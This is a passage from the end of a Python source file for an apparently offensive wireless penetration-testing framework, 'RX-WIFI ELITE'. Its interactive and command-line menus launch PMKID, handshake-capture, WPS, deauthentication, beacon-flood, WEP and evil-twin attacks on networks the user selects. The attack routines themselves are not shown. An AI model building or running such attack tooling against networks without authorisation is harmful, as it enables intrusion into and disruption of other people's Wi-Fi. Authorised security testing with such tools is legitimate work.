                    input("\nPress Enter to continue...")
                    
                elif choice == "3":
                    channels = input("ENTER CHANNELS (comma separated): ").strip()
                    if channels:
                        try:
                            channel_list = [int(c.strip()) for c in channels.split(',')]
                            self.scanner.scan(duration=30, channels=channel_list)
                        except ValueError:
                            print(f"{EliteGraphics.color('✗', 196)} INVALID CHANNELS")
                    input("\nPress Enter to continue...")
                    
                elif choice == "4":
                    if self.scanner.networks:
                        EliteGraphics.show_networks(self.scanner.networks)
                    else:
                        print(f"{EliteGraphics.color('✗', 196)} NO SCAN DATA")
                    input("\nPress Enter to continue...")
                    
                elif choice == "5":
                    break
                    
                else:
                    print(f"{EliteGraphics.color('✗', 196)} INVALID CHOICE")
                    
            except KeyboardInterrupt:
                print(f"\n{EliteGraphics.color('⚠', 214)} INTERRUPTED")
                break
    
    def attack_menu(self):
        """Attack menu"""
        if not self.attack_engine or not self.scanner:
            print(f"{EliteGraphics.color('✗', 196)} ENABLE MONITOR MODE AND SCAN FIRST")
            time.sleep(2)
            return
        
        if not self.scanner.networks:
            print(f"{EliteGraphics.color('✗', 196)} NO NETWORKS FOUND. SCAN FIRST.")
            time.sleep(2)
            return
        
        # Show top networks
        EliteGraphics.show_networks(self.scanner.networks, 10)
        
        try:
            target_idx = input(f"\n{EliteGraphics.color('[?] SELECT TARGET (0 to cancel):', 51)} ").strip()
            if target_idx == "0":
                return
            
            idx = int(target_idx) - 1
            networks = list(self.scanner.networks.values())
            
            if 0 <= idx < len(networks):
                target = networks[idx]
                
                print(f"\n{EliteGraphics.color('═' * 70, 45)}")
                print(f"{EliteGraphics.color('TARGET:', 226)} {target.essid}")
                print(f"{EliteGraphics.color('BSSID:', 226)} {target.bssid}")
                print(f"{EliteGraphics.color('CHANNEL:', 226)} {target.channel}")
                print(f"{EliteGraphics.color('SIGNAL:', 226)} {target.signal}dBm")
                print(f"{EliteGraphics.color('ENCRYPTION:', 226)} {target.encryption}")
                print(f"{EliteGraphics.color('SECURITY:', 226)} {target.security_score}/100")
                print(f"{EliteGraphics.color('RECOMMENDED:', 226)} {target.recommended_attack}")
                print(f"{EliteGraphics.color('═' * 70, 45)}")
                
                print(f"\n{EliteGraphics.color('1', 226)}. PMKID ATTACK")
                print(f"{EliteGraphics.color('2', 226)}. HANDSHAKE CAPTURE")
                print(f"{EliteGraphics.color('3', 226)}. WPS PIXIE DUST")
                print(f"{EliteGraphics.color('4', 226)}. WPS PIN ATTACK")
                print(f"{EliteGraphics.color('5', 226)}. DEAUTH ATTACK")
                print(f"{EliteGraphics.color('6', 226)}. BEACON FLOOD")
                print(f"{EliteGraphics.color('7', 226)}. WEP ATTACK")
                print(f"{EliteGraphics.color('8', 226)}. EVIL TWIN")
                print(f"{EliteGraphics.color('9', 226)}. BACK")
                
                attack_choice = input(f"\n{EliteGraphics.color('[?] SELECT ATTACK:', 51)} ").strip()
                
                if attack_choice == "1":
                    self.attack_engine.execute_pmkid_attack(target.bssid)
                elif attack_choice == "2":
                    self.attack_engine.execute_handshake_attack(
                        target.bssid, target.channel, target.essid
                    )
                elif attack_choice == "3":
                    self.attack_engine.execute_wps_attack(
                        target.bssid, target.channel, "pixie"
                    )
                elif attack_choice == "4":
                    self.attack_engine.execute_wps_attack(
                        target.bssid, target.channel, "pin"
                    )
                elif attack_choice == "5":
                    count = input("DEAUTH COUNT (0=continuous): ").strip() or "0"
                    self.attack_engine.execute_deauth_attack(
                        target.bssid, count=int(count)
                    )
                elif attack_choice == "6":
                    self.attack_engine.execute_beacon_flood()
                elif attack_choice == "7":
                    if 'WEP' in target.encryption.upper():
                        self.attack_engine.execute_wep_attack(target.bssid, target.channel)
                    else:
                        print(f"{EliteGraphics.color('✗', 196)} NOT A WEP NETWORK")
                elif attack_choice == "8":
                    self.attack_engine.execute_evil_twin(
                        target.essid, target.bssid, target.channel
                    )
                
                input("\nPress Enter to continue...")
                
            else:
                print(f"{EliteGraphics.color('✗', 196)} INVALID SELECTION")
                time.sleep(1)
                
        except ValueError:
            print(f"{EliteGraphics.color('✗', 196)} INVALID INPUT")
            time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{EliteGraphics.color('⚠', 214)} CANCELLED")
    
    def reports_menu(self):
        """Reports menu"""
        EliteGraphics.clear()
        EliteGraphics.show_menu_title("REPORTS")
        
        print(f"{EliteGraphics.color('1', 226)}. GENERATE SCAN REPORT")
        print(f"{EliteGraphics.color('2', 226)}. LIST AVAILABLE REPORTS")
        print(f"{EliteGraphics.color('3', 226)}. BACK")
        
        try:
            choice = input(f"\n{EliteGraphics.color('[?] SELECT:', 51)} ").strip()
            
            if choice == "1":
                if self.scanner and self.scanner.networks:
                    self.report_generator.generate_scan_report(
                        self.scanner.networks,
                        self.scanner.clients
                    )
                else:
                    print(f"{EliteGraphics.color('✗', 196)} NO SCAN DATA")
            elif choice == "2":
                reports = list(self.report_generator.output_dir.glob("*.json"))
                if reports:
                    print(f"\n{EliteGraphics.color('→', 51)} AVAILABLE REPORTS:")
                    for report in reports:
                        size = report.stat().st_size / 1024
                        print(f"  {report.name} ({size:.1f} KB)")
                else:
                    print(f"{EliteGraphics.color('✗', 196)} NO REPORTS")
            elif choice == "3":
                return
            
            input("\nPress Enter to continue...")
            
        except KeyboardInterrupt:
            print(f"\n{EliteGraphics.color('⚠', 214)} INTERRUPTED")
    
    def utilities_menu(self):
        """Utilities menu"""
        while True:
            EliteGraphics.clear()
            EliteGraphics.show_menu_title("UTILITIES")
            
            print(f"{EliteGraphics.color('1', 226)}. CHECK DEPENDENCIES")
            print(f"{EliteGraphics.color('2', 226)}. CLEAN TEMP FILES")
            print(f"{EliteGraphics.color('3', 226)}. UPDATE TOOLS")
            print(f"{EliteGraphics.color('4', 226)}. SYSTEM INFO")
            print(f"{EliteGraphics.color('5', 226)}. BACK")
            
            try:
                choice = input(f"\n{EliteGraphics.color('[?] SELECT:', 51)} ").strip()
                
                if choice == "1":
                    deps = SystemValidator.check_dependencies()
                    print(f"\n{EliteGraphics.color('→', 51)} DEPENDENCY CHECK:")
                    for tool, avail in deps.items():
                        status = EliteGraphics.color("✓", 46) if avail else EliteGraphics.color("✗", 196)
                        print(f"  {status} {tool}")
                    input("\nPress Enter to continue...")
                    
                elif choice == "2":
                    self._clean_temp_files()
                    
                elif choice == "3":
                    self._update_tools()
                    
                elif choice == "4":
                    self._show_system_info()
                    
                elif choice == "5":
                    break
                    
                else:
                    print(f"{EliteGraphics.color('✗', 196)} INVALID CHOICE")
                    
            except KeyboardInterrupt:
                print(f"\n{EliteGraphics.color('⚠', 214)} INTERRUPTED")
                break
    
    def _clean_temp_files(self):
        """Clean temporary files"""
        EliteGraphics.show_loading("CLEANING TEMP FILES")
        
        patterns = [
            '*.cap',
            '*.csv',
            '*.pcapng',
            '*.hash',
            'rx_scan_*',
            'attack_*',
            'handshake_*',
            'pmkid_*',
            'wep_*'
        ]
        
        for pattern in patterns:
            subprocess.run(f'rm -f {pattern}', shell=True,
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
        
        print(f"{EliteGraphics.color('✓', 46)} TEMP FILES CLEANED")
        time.sleep(1)
    
    def _update_tools(self):
        """Update security tools"""
        print(f"\n{EliteGraphics.color('⚠', 214)} UPDATE SYSTEM TOOLS?")
        confirm = input("CONFIRM (y/n): ").strip().lower()
        
        if confirm == 'y':
            EliteGraphics.show_loading("UPDATING TOOLS")
            
            try:
                subprocess.run(['apt-get', 'update'],
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL)
                
                subprocess.run(['apt-get', 'upgrade', '-y', 'aircrack-ng', 'reaver', 'bully', 'hcxtools', 'mdk4'],
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL)
                
                print(f"{EliteGraphics.color('✓', 46)} TOOLS UPDATED")
            except:
                print(f"{EliteGraphics.color('✗', 196)} UPDATE FAILED")
        
        time.sleep(1)
    
    def _show_system_info(self):
        """Show system information"""
        try:
            print(f"\n{EliteGraphics.color('→', 51)} SYSTEM INFORMATION:")
            
            # OS
            subprocess.run(['uname', '-a'])
            
            # CPU
            with open('/proc/cpuinfo', 'r') as f:
                for line in f:
                    if 'model name' in line:
                        print(f"CPU: {line.split(':')[1].strip()}")
                        break
            
            # Memory
            with open('/proc/meminfo', 'r') as f:
                mem_total = f.readline().split()[1]
                print(f"Memory: {int(mem_total) // 1024} MB")
            
            # Disk
            subprocess.run(['df', '-h', '/'])
            
        except Exception as e:
            print(f"{EliteGraphics.color('✗', 196)} ERROR: {e}")
        
        input("\nPress Enter to continue...")
    
    def cleanup(self):
        """Cleanup before exit"""
        EliteGraphics.show_loading("CLEANING UP")
        
        # Stop attacks
        if self.attack_engine:
            self.attack_engine.stop_all_attacks()
        
        # Restore interfaces
        if self.interface_manager:
            self.interface_manager.restore_all()
        
        # Clean temp files
        self._clean_temp_files()
        
        # Show exit message
        EliteGraphics.show_banner()
        print(f"\n{EliteGraphics.color('═' * 70, 45)}")
        print(f"{EliteGraphics.color('✓', 46)} RX-WIFI ELITE SHUTDOWN COMPLETE")
        print(f"{EliteGraphics.color('⚠', 214)} FOR AUTHORIZED SECURITY TESTING ONLY!")
        print(f"{EliteGraphics.color('⚡', 226)} USE RESPONSIBLY AND LEGALLY!")
        print(f"{EliteGraphics.color('═' * 70, 45)}")

# ============================================================================
# MAIN EXECUTION
# ============================================================================

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="RX-WIFI ELITE v4.0 - Ultimate Wireless Penetration Testing Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument(
        '--interactive',
        action='store_true',
        help='Launch interactive mode'
    )
    
    parser.add_argument(
        '--interface',
        help='Wireless interface to use'
    )
    
    parser.add_argument(
        '--scan',
        type=int,
        help='Scan duration in seconds'
    )
    
    parser.add_argument(
        '--target',
        help='Target BSSID for attack'
    )
    
    parser.add_argument(
        '--attack',
        choices=['pmkid', 'handshake', 'wps', 'deauth', 'beacon', 'wep'],
        help='Attack type'
    )
    
    parser.add_argument(
        '--channel',
        type=int,
        help='Channel for attack'
    )
    
    parser.add_argument(
        '--debug',
        action='store_true',
        help='Enable debug mode'
    )
    
    args = parser.parse_args()
    
    try:
        # Create command center
        command_center = EliteCommandCenter(debug=args.debug)
        
        # Initialize
        if not command_center.initialize():
            sys.exit(1)
        
        if args.interactive or not any([args.interface, args.scan, args.target]):
            # Interactive mode
            command_center.main_menu()
        else:
            # Command line mode
            if args.interface:
                command_center.interface_manager = EliteInterfaceManager()
                command_center.interface_manager.discover_all()
                
                if args.interface in command_center.interface_manager.interfaces:
                    monitor_iface = command_center.interface_manager.enable_monitor_mode(args.interface)
                    
                    if monitor_iface:
                        command_center.scanner = EliteNetworkScanner(monitor_iface)
                        command_center.attack_engine = EliteAttackEngine(monitor_iface)
                        
                        if args.scan:
                            command_center.scanner.scan(duration=args.scan)
                        
                        if args.target and args.attack:
                            if args.attack == 'pmkid':
                                command_center.attack_engine.execute_pmkid_attack(args.target)
                            elif args.attack == 'handshake' and args.channel:
                                command_center.attack_engine.execute_handshake_attack(
                                    args.target, args.channel
                                )
                            elif args.attack == 'wps' and args.channel:
                                command_center.attack_engine.execute_wps_attack(
                                    args.target, args.channel
                                )
                            elif args.attack == 'deauth':
                                command_center.attack_engine.execute_deauth_attack(args.target)
                            elif args.attack == 'beacon':
                                command_center.attack_engine.execute_beacon_flood()
                            elif args.attack == 'wep' and args.channel:
                                command_center.attack_engine.execute_wep_attack(
                                    args.target, args.channel
                                )
                else:
                    print(f"{EliteGraphics.color('✗', 196)} INVALID INTERFACE")
            
            else:
                print(f"{EliteGraphics.color('✗', 196)} INTERFACE REQUIRED")
                parser.print_help()
        
    except KeyboardInterrupt:
        print(f"\n\n{EliteGraphics.color('⚠', 214)} PROGRAM TERMINATED")
        sys.exit(0)
    except Exception as e:
        print(f"\n{EliteGraphics.color('✗', 196)} FATAL ERROR: {e}")
        if args.debug:
            import traceback
            traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
